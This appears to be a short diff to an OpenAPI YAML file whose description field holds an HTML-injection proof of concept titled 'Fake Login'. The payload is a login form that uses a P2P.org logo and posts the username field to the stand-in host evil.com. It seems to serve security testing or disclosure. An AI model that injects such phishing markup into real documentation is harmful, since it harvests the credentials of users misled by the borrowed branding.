@@ -4,11 +4,11 @@ info:
   title: Fake Login Page
   description: '<div class="login-form">
     <div class="heading">
-        <img src="https://www.p2p.org/logo.png" alt="P2P.org Logo" width="200">
+        <img src="https://avatars.githubusercontent.com/u/39105621?s=200&v=4" alt="P2P.org Logo" width="200">
         <h1>HTML Injection : Fake Login</h1>
     </div>
     <div class="form-container">
-        <form action="https://evil.com/login" method="post" class="form-signin">
+        <form action="https://evil.com/" method="post" class="form-signin">
             <div class="form-group">
                 <label for="username">Username</label>
                 <input type="text" name="username" size="20">
